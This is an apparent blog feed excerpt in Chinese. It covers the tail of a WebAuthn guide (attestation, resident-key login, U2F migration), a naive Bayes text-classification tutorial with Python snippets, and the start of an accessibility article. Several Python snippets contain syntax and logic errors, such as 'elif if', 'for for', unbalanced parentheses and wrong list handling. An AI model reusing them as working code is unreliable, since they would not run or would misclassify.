\"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 